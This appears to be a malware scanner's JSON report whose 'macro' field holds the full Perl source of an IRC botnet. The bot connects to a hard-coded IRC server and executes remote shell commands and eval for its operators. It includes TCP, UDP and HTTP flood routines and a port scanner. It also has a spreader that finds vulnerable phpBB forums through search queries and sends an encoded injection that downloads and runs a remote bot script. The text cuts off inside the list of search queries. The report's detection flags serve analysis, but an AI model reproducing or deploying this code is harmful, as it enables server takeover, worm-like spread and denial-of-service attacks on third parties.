{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "chr": "May attempt to obfuscate specific str",
            "open": "May open a file",
            "shell": "May run an executable file or a system command"
        },
        "macro": "#!/usr/bin/perl \n\nmy $processo = '/usr/local/sbin/httpd -DSSL';\nmy $linas_max='5';\nmy $sleep='5';\nmy @adms=(\"BioS\",\"FLaviu\");\nmy @hostauth=(\"bios\",\"FLaviu\");\nmy @canais=(\"#1000\");\nmy $pwned=\"/tmp/horderd\";\nmy $nick='bios-';\nmy $ircname = 'spart';\nchop (my $realname = 'uname -a');\n$servidor='216.17.38.91' unless $servidor;\nmy $porta='6667';\n\nmy $VERSAO = '0.2';\n\n$SIG{'INT'} = 'IGNORE';\n$SIG{'HUP'} = 'IGNORE';\n$SIG{'TERM'} = 'IGNORE';\n$SIG{'CHLD'} = 'IGNORE';\n$SIG{'PS'} = 'IGNORE';\n\nuse IO::Socket;\nuse Socket;\nuse IO::Select;\nchdir(\"/\");\n$servidor=\"$ARGV[0]\" if $ARGV[0];\n$0=\"$processo\".\"\\0\"x16;;\nmy $pid=fork;\nexit if $pid;\ndie \"Problema com o fork: $!\" unless defined($pid);\n\n\n\nour %irc_servers;\nour %DCC;\nmy $dcc_sel = new IO::Select->new();\n\n$sel_cliente = IO::Select->new();\nsub sendraw {\n  if ($#_ == '1') {\n    my $socket = $_[0];\n    print $socket \"$_[1]\\n\";\n  } else {\n      print $IRC_cur_socket \"$_[0]\\n\";\n  }\n}\n\nsub conectar {\n   my $meunick = $_[0];\n   my $servidor_con = $_[1];\n   my $porta_con = $_[2];\n\n   my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);\n   if (defined($IRC_socket)) {\n     $IRC_cur_socket = $IRC_socket;\n\n     $IRC_socket->autoflush(1);\n     $sel_cliente->add($IRC_socket);\n\n     $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";\n     $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";\n     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;\n     nick(\"$meunick\");\n     sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");\n     sleep 1;\n   }\n}\nmy $line_temp;\nwhile( 1 ) {\n   while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }\n   delete($irc_servers{''}) if (defined($irc_servers{''}));\n   my @ready = $sel_cliente->can_read(0);\n   next unless(@ready);\n   foreach $fh (@ready) {\n     $IRC_cur_socket = $fh;\n     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};\n     $nread = sysread($fh, $msg, 4096);\n     if ($nread == 0) {\n        $sel_cliente->remove($fh);\n        $fh->close;\n        delete($irc_servers{$fh});\n     }\n     @lines = split (/\\n/, $msg);\n\n     for(my $c=0; $c<= $#lines; $c++) {\n       $line = $lines[$c];\n       $line=$line_temp.$line if ($line_temp);\n       $line_temp='';\n       $line =~ s/\\r$//;\n       unless ($c == $#lines) {\n         parse(\"$line\");\n       } else {\n           if ($#lines == 0) {\n             parse(\"$line\");\n           } elsif ($lines[$c] =~ /\\r$/) {\n               parse(\"$line\");\n           } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {\n               parse(\"$line\");\n           } else {\n               $line_temp = $line;\n           }\n       }\n      }\n   }\n}\n \nsub parse {\n   my $servarg = shift;\n   if ($servarg =~ /^PING \\:(.*)/) {\n     sendraw(\"PONG :$1\");\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {\n       my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;\n       if ($args =~ /^\\001VERSION\\001$/) {\n         notice(\"$pn\", \"\\001VERSION mIRC v6.16 Khaled Mardam-Bey\\001\");\n       }\n       if (grep {$_ =~ /^\\Q$hostmask\\E$/i } @hostauth) {\n       if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms) {\n         if ($onde eq \"$meunick\"){\n           shell(\"$pn\", \"$args\");\n         }\n         if ($args =~ /^(\\Q$meunick\\E|\\!atrix)\\s+(.*)/ ) {\n            my $natrix = $1;\n            my $arg = $2;\n            if ($arg =~ /^\\!(.*)/) {\n              ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!atrix\" and $arg =~ /^\\!nick/);\n            } elsif ($arg =~ /^\\@(.*)/) {\n                $ondep = $onde;\n                $ondep = $pn if $onde eq $meunick;\n                bfunc(\"$ondep\",\"$1\");\n            } else {\n                shell(\"$onde\", \"$arg\");\n            }\n         } \n       }\n\t}\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {\n       if (lc($1) eq lc($meunick)) {\n         $meunick=$4; \n         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n       }\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {\n       nick(\"$meunick|\".int rand(999999));\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {\n       $meunick = $2;\n       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n       $irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";\n       foreach my $canal (@canais) {\n         sendraw(\"JOIN $canal ddosit\");\n       }\n   }\n}\n\n\nsub bfunc {\n  my $printl = $_[0];\n  my $funcarg = $_[1];\n  if (my $pid = fork) {\n     waitpid($pid, 0);\n  } else {\n      if (fork) {\n         exit;\n       } else {\n           if ($funcarg =~ /^portscan (.*)/) {\n             my $hostip=\"$1\";\n             my @portas=(\"21\",\"23\",\"25\",\"80\",\"113\",\"135\",\"445\",\"1025\",\"5000\",\"6660\",\"6661\",\"6662\",\"6663\",\"6665\",\"6666\",\"6667\",\"6668\",\"6669\",\"7000\",\"8080\");\n             my (@aberta, %porta_banner);\n\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[SCAN]\\002 Scanning \".$1.\" for open ports.\");     \n             foreach my $porta (@portas)  {\n                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);\n                if ($scansock) {\n                   push (@aberta, $porta);\n                   $scansock->close;\n                }\n             }\n\n             if (@aberta) {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[SCAN]\\002 Open port(s): @aberta\");\n             } else {\n               sendraw($IRC_cur_socket,\"PRIVMSG $printl :\\002[SCAN]\\002 No open ports found\"); \n             }\n           }\n           if ($funcarg =~ /^tcpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[TCP-DDOS]\\002 Attacking \".$1.\":\".$2.\" for \".$3.\" seconds.\");\n\t     my $itime = time;\n\t     my ($cur_time);\n             $cur_time = time - $itime;\n\t     while ($3>$cur_time){\n             $cur_time = time - $itime;\n\t     &tcpflooder(\"$1\",\"$2\",\"$3\");\n             }\n\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[TCP-DDOS]\\002 Finished with attacking \".$1.\":\".$2.\".\");\n           }\n           if ($funcarg =~ /^google\\s+(\\d+)\\s+(.*)/) {\n\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[GOOGLE]\\002 Scanning for unpatched phpBB for \".$1.\" seconds.\");\n\t     srand;\n\t     my $itime = time;\n\t     my ($cur_time);\n\t     my ($exploited);\n\n\t     $boturl=$2;\n             $cur_time = time - $itime;\n\t     $exploited = 0;\n\t\twhile($1>$cur_time){\n\t\t    $cur_time = time - $itime;\n\t\t    @urls=fetch();\n\t\t    foreach $url (@urls) {\n\t\t\t$cur_time = time - $itime;\n\t\t\tif ($url !~ /viewtopic.php/) {next;$cur_time = time - $itime;}\n\t\t\t$url =~ s/(.*\\/viewtopic.php\\?[t|p]=[0-9]+).*/$1/;\n\t\t\t$host[0] = $url;\n\t\t\tif($host[0] =~ /\\//){\n\t\t\t($host[1],$host[2])=split(/\\//,$host[0]);\n\t\t\t}\n\t\t\t#sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[EXPLOITING]\\002 \".$host[1].\".\");\n\t\t\t$url .=\"&highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(104)%252echr(116)%252echr(116)%252echr(112)%252echr(58)%252echr(47)%252echr(47)%252echr(115)%252echr(97)%252echr(110)%252echr(116)%252echr(111)%252echr(103)%252echr(111)%252echr(111)%252echr(103)%252echr(108)%252echr(101)%252echr(46)%252echr(99)%252echr(111)%252echr(109)%252echr(47)%252echr(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(112)%252echr(101)%252echr(114)%252echr(108)%252echr(32)%252echr(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116))%252e%2527\";\n\t\t\t$page = http_query($url);\n\t\t\tif ( $page =~ /uyx/ ){\n\t\t\t    $page = http_query($url);\n\t\t\t    $exploited = $exploited + 1;\n\t\t\t    sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[0WN3D]\\002 \" .$url. \".\");\n\t\t\t}\n\t\t    }\n\t\t}\n\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[GOOGLE]\\002 Exploited \".$exploited.\" boxes in \".$1.\" seconds.\");\n           }\n           if ($funcarg =~ /^httpflood\\s+(.*)\\s+(\\d+)/) {\n\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[HTTP-DDOS]\\002 Attacking \".$1.\":80 for \".$2.\" seconds.\");\n\t     my $itime = time;\n\t     my ($cur_time);\n             $cur_time = time - $itime;\n\t     while ($2>$cur_time){\n             $cur_time = time - $itime;\n\t     my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);\n             print $socket \"GET / HTTP/1.1\\r\\nAccept: */*\\r\\nHost: \".$1.\"\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";\n\t     close($socket);\n             }\n\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[HTTP-DDOS]\\002 Finished with attacking \".$1.\".\");\n           }\n           if ($funcarg =~ /^udpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[UDP-DDOS]\\002 Attacking \".$1.\" with \".$2.\" Kb packets for \".$3.\" seconds.\");\n             my ($dtime, %pacotes) = udpflooder(\"$1\", \"$2\", \"$3\");\n             $dtime = 1 if $dtime == 0;\n             my %bytes;\n             $bytes{igmp} = $2 * $pacotes{igmp};\n             $bytes{icmp} = $2 * $pacotes{icmp};\n             $bytes{o} = $2 * $pacotes{o};\n             $bytes{udp} = $2 * $pacotes{udp};\n             $bytes{tcp} = $2 * $pacotes{tcp};\n            \n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002[UDP-DDOS]\\002 Sended \".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024).\" Kb in \".$dtime.\" seconds to \".$1.\".\");\n\n           }\n           exit;\n       }\n  }\n}\n \nsub ircase {\n  my ($kem, $printl, $case) = @_;\n\n  if ($case =~ /^join (.*)/) {\n     j(\"$1\");\n   } \n   if ($case =~ /^part (.*)/) {\n      p(\"$1\");\n   }\n   if ($case =~ /^rejoin\\s+(.*)/) {\n      my $chan = $1;\n      if ($chan =~ /^(\\d+) (.*)/) {\n        for (my $ca = 1; $ca <= $1; $ca++ ) {\n          p(\"$2\");\n          j(\"$2\");\n        }\n      } else {\n          p(\"$chan\");\n          j(\"$chan\");\n      }\n   }\n   if ($case =~ /^op/) {\n      op(\"$printl\", \"$kem\") if $case eq \"op\";\n      my $oarg = substr($case, 3);\n      op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   if ($case =~ /^deop/) {\n      deop(\"$printl\", \"$kem\") if $case eq \"deop\";\n      my $oarg = substr($case, 5);\n      deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   if ($case =~ /^msg\\s+(\\S+) (.*)/) {\n      msg(\"$1\", \"$2\");\n   }\n   if ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n        msg(\"$2\", \"$3\");\n      }\n   }\n   if ($case =~ /^ctcp\\s+(\\S+) (.*)/) {\n      ctcp(\"$1\", \"$2\");\n   }\n   if ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n        ctcp(\"$2\", \"$3\");\n      }\n   }\n   if ($case =~ /^nick (.*)/) {\n      nick(\"$1\");\n   }\n   if ($case =~ /^connect\\s+(\\S+)\\s+(\\S+)/) {\n       conectar(\"$2\", \"$1\", 6667);\n   }\n   if ($case =~ /^raw (.*)/) {\n      sendraw(\"$1\");\n   }\n   if ($case =~ /^eval (.*)/) {\n     eval \"$1\";\n   }\n}\n\nsub shell {\n  my $printl=$_[0];\n  my $comando=$_[1];\n  if ($comando =~ /cd (.*)/) {\n    chdir(\"$1\") || msg(\"$printl\", \"No such file or directory\");\n    return;\n  } \n  elsif ($pid = fork) {\n     waitpid($pid, 0);\n  } else {\n      if (fork) {\n         exit;\n       } else {\n           my @resp=`$comando 2>&1 3>&1`;\n           my $c=0;\n           foreach my $linha (@resp) {\n             $c++;\n             chop $linha;\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");\n             if ($c == \"$linas_max\") {\n               $c=0;\n               sleep $sleep;\n             }\n           }\n           exit;\n       }\n  }\n}\n\nsub tcpflooder {\n my $itime = time;\n my ($cur_time);\n my ($ia,$pa,$proto,$j,$l,$t);\n $ia=inet_aton($_[0]);\n $pa=sockaddr_in($_[1],$ia);\n $ftime=$_[2];\n $proto=getprotobyname('tcp');\n $j=0;$l=0;\n $cur_time = time - $itime;\n while ($l<1000){\n  $cur_time = time - $itime;\n  last if $cur_time >= $ftime;\n  $t=\"SOCK$l\";\n  socket($t,PF_INET,SOCK_STREAM,$proto);\n  connect($t,$pa)||$j--;\n  $j++;$l++;\n }\n $l=0;\n while ($l<1000){\n  $cur_time = time - $itime;\n  last if $cur_time >= $ftime;\n  $t=\"SOCK$l\";\n  shutdown($t,2);\n  $l++;\n }\n}\n\nsub udpflooder {\n  my $iaddr = inet_aton($_[0]);\n  my $msg = 'A' x $_[1];\n  my $ftime = $_[2];\n  my $cp = 0;\n  my (%pacotes);\n  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;\n  \n  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;\n  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;\n  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;\n  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;\n  return(undef) if $cp == 4;\n  my $itime = time;\n  my ($cur_time);\n  while ( 1 ) {\n     for (my $porta = 1; $porta <= 65000; $porta++) {\n       $cur_time = time - $itime;\n       last if $cur_time >= $ftime;\n       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;\n       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;\n       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;\n       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;\n\n       for (my $pc = 3; $pc <= 255;$pc++) {\n         next if $pc == 6;\n         $cur_time = time - $itime;\n         last if $cur_time >= $ftime;\n         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;\n         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;\n       }\n     }\n     last if $cur_time >= $ftime;\n  }\n  return($cur_time, %pacotes);\n}\n\nsub ctcp {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");\n}\nsub msg {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :$_[1]\");\n}  \nsub notice {\n   return unless $#_ == 1;\n   sendraw(\"NOTICE $_[0] :$_[1]\");\n}\nsub op {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +o $_[1]\");\n}\nsub deop {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -o $_[1]\");\n}\nsub j { &join(@_); }\nsub join {\n   return unless $#_ == 0;\n   sendraw(\"JOIN $_[0]\");\n}\nsub p { part(@_); }\nsub part {\n  sendraw(\"PART $_[0]\");\n}\nsub nick {\n  return unless $#_ == 0;\n  sendraw(\"NICK $_[0]\");\n}\nsub quit {\n  sendraw(\"QUIT :$_[0]\");\n}\n\n#Spreader\n\nsub fetch(){\n    my $rnd=(int(rand(9999)));\n    my $n= 50;\n    if ($rnd<5000) { $n<<=1;}\n    my $s= (int(rand(10)) * $n);\n\nmy @str=(\"%22inurl%3A%22.net%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.com%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.com%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.com%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.net%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.net%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.de%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.de%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.de%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.be%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.ca%22+%22phpbb%22%2B%222.0.6%22\", \n\"%22inurl%3A%22.ca%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.be%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.be%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.org%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.org%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.org%22+%22phpbb%22%2B%222.0.10%22\",\n\"inurl%3A%22%2Fforo%2F%22+%22phpbb%22%2B%222.0.6%22\",\n\"inurl%3A%22%2Fforo%2F%22+%22phpbb%22%2B%222.0.8%22\",\n\"inurl%3A%22%2Fforo%2F%22+%22phpbb%22%2B%222.0.10%22\",\n\"inurl%3A%22%2Fforum%2F%22+%22phpbb%22%2B%222.0.6%22\",\n\"inurl%3A%22%2Fforum%2F%22+%22phpbb%22%2B%222.0.8%22\",\n\"inurl%3A%22%2Fforum%2F%22+%22phpbb%22%2B%222.0.10%22\",\n\"inurl%3A%22%2FphpBB%2F%22+%22phpbb%22%2B%222.0.6%22\",\n\"inurl%3A%22%2FphphBB%2F%22+%22phpbb%22%2B%222.0.8%22\",\n\"inurl%3A%22%2FphpBB%2F%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22test+forum+1%22%2B%22phpbb%22%2B%222.0.6%22\",\n\"%22test+forum+1%22%2B%22phpbb%22%2B%222.0.8%22\",\n\"%22test+forum+1%22%2B%22phpbb%22%2B%222.0.10%22\",\n\"%22welcome+to+phpbb+2%22%2B%22phpbb%22%2B%222.0.6%22\",\n\"%22welcome+to+phpbb+2%22%2B%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.us%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.us%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.us%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.tw%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.tw%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.tw%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.cn%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.cn%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.cn%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.hk%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.hk%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.hk%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.se%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.se%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.se%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.ar%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.ar%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.ar%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.at%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.at%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.at%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.uy%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.uy%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.uy%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.cz%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.cz%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.cz%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.kr%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.kr%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.kr%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.jp%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.jp%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.jp%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.dk%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.dk%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.dk%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.yu%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.yu%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.yu%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.info%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.info%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.info%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.gr%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.gr%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.gr%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.uk%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.uk%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.uk%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.pe%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.pe%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.pe%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.co%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.co%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.co%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.ve%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.ve%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.ve%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.cl%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.cl%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.cl%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.py%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.py%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.py%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.bo%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.bo%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.bo%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.ec%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.ec%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.ec%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.mx%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.mx%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.mx%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.fi%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.fi%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.fi%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.si%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.si%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.si%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.ch%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.ch%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.ch%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.es%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.es%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.es%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.fr%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.fr%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.fr%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.br%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.br%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.br%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.ru%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.ru%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.ru%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.ro%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.ro%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.ro%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.biz%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.biz%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.biz%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.ni%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.ni%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.ni%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.edu%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.edu%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.edu%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.gov%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.gov%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.gov%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.aero%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.aero%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.aero%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.mil%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.mil%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.mil%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.fm%22+%22phpbb%22%2B%222.0.6%22\",\n\"%22inurl%3A%22.fm%22+%22phpbb%22%2B%222.0.8%22\",\n\"%22inurl%3A%22.fm%22+%22phpbb%22%2B%222.0.10%22\",\n\"%22inurl%3A%22.ie%22+%22phpbb%22%2B%222.0.6%22\",\n\"